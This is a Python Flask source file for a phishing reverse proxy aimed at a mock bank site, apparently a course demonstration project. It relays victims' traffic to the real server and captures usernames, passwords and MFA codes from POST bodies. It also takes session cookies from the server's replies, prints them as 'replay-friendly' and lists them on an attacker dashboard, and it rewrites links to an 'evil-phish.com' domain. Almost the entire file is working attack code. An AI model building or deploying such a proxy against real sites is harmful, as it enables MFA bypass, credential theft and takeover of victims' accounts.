from flask import Flask, request, Response, jsonify, render_template
import requests
from datetime import datetime
from urllib.parse import parse_qs




app = Flask(__name__)
REAL_SERVER = "http://378proj-real-bank.com:5000"
stolen_sessions = []
captured_events = []
MAX_EVENTS = 100






def record_event(event_type, ip, path, **details):
    event = {
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "type": event_type,
        "ip": ip,
        "path": path,
    }
    event.update(details)
    captured_events.insert(0, event)
    del captured_events[MAX_EVENTS:]
    return event




@app.route('/dashboard')
def dashboard():
    return render_template('phish_dashboard.html')




@app.route('/api/events')
def api_events():
    latest_credentials = next((e for e in captured_events if e['type'] == 'credentials'), None)
    latest_mfa = next((e for e in captured_events if e['type'] == 'mfa'), None)
    latest_session = next((e for e in captured_events if e['type'] == 'session'), None)
    return jsonify({
        'events': captured_events,
        'total_events': len(captured_events),
        'latest_credentials': latest_credentials,
        'latest_mfa': latest_mfa,
        'latest_session': latest_session,
    })




@app.route('/stolen')
def stolen():
    if not stolen_sessions:
        return "<h2>No stolen sessions captured yet.</h2><p><a href='/dashboard'>Open dashboard</a></p>"


    items = []
    for idx, entry in enumerate(stolen_sessions, start=1):
        items.append(f'''
            <li>
                <strong>Capture #{idx}</strong><br>
                Time: {entry['timestamp']}<br>
                Path: {entry['path']}<br>
                Victim IP: {entry['ip']}<br>
                Session ID: <code>{entry['session_id']}</code>
            </li>
        ''')


    return f"<h2>Captured Sessions</h2><p><a href='/dashboard'>Open dashboard</a></p><ol>{''.join(items)}</ol>"




@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def proxy(path):
    reserved_paths = {'dashboard', 'api/events', 'stolen'}
    if path in reserved_paths:
        return Response('Not found', status=404)


    url = f"{REAL_SERVER}/{path}"
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    client_ip = request.remote_addr
    display_path = f"/{path}" if path else "/"


    print(f"[{timestamp}] {client_ip} -> {request.method} {display_path}")


    record_event('request', client_ip, display_path, note=f"{request.method} request forwarded")


    if request.method == 'POST':
        raw_body = request.get_data(as_text=True)
        print(f"    Intercepted POST body: {raw_body}")


        parsed = parse_qs(raw_body)
        if 'user' in parsed or 'pw' in parsed:
            username = parsed.get('user', [''])[0]
            password = parsed.get('pw', [''])[0]
            record_event('credentials', client_ip, display_path, username=username, password=password)
            print(f"    Captured credentials -> user={username} pw={password}")
        if 'code' in parsed:
            code = parsed.get('code', [''])[0]
            record_event('mfa', client_ip, display_path, code=code)
            print(f"    Captured MFA code -> {code}")


    resp = requests.request(
        method=request.method,
        url=url,
        data=request.get_data(),
        headers={k: v for k, v in request.headers if k.lower() != 'host'},
        cookies=request.cookies,
        allow_redirects=False,
        timeout=10,
    )


    html_content = resp.content.decode('utf-8', errors='ignore')
    modified_content = html_content.replace("real-bank.com:5000", "evil-phish.com:5001")


    if '</body>' in modified_content:
        modified_content = modified_content.replace(
            '</body>',
            "<div style='position:fixed;bottom:10px;right:10px;background:#8b0000;color:white;padding:8px 12px;border-radius:8px;font-family:Arial;'>Demo Proxy Active</div></body>"
        )


    if 'Set-Cookie' in resp.headers:
        full_cookie = resp.headers['Set-Cookie']
        session_value = full_cookie.split(';')[0]
        if session_value.startswith('session_id='):
            session_id = session_value.split('=', 1)[1]
            session_record = {
                'timestamp': timestamp,
                'path': display_path,
                'ip': client_ip,
                'session_id': session_id,
            }
            stolen_sessions.append(session_record)
            record_event('session', client_ip, display_path, session_id=session_id)
            print("\n" + "!" * 40)
            print("SUCCESS: STOLEN SESSION COOKIE BELOW")
            print(full_cookie)
            print(f"Replay-friendly session_id: {session_id}")
            print("Open attacker dashboard at: http://127.0.0.1:5001/dashboard")
            print("!" * 40 + "\n")


    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for (name, value) in resp.headers.items()
               if name.lower() not in excluded_headers]


    return Response(modified_content.encode('utf-8'), resp.status_code, headers)




if __name__ == '__main__':
    app.run(port=5001, debug=True)



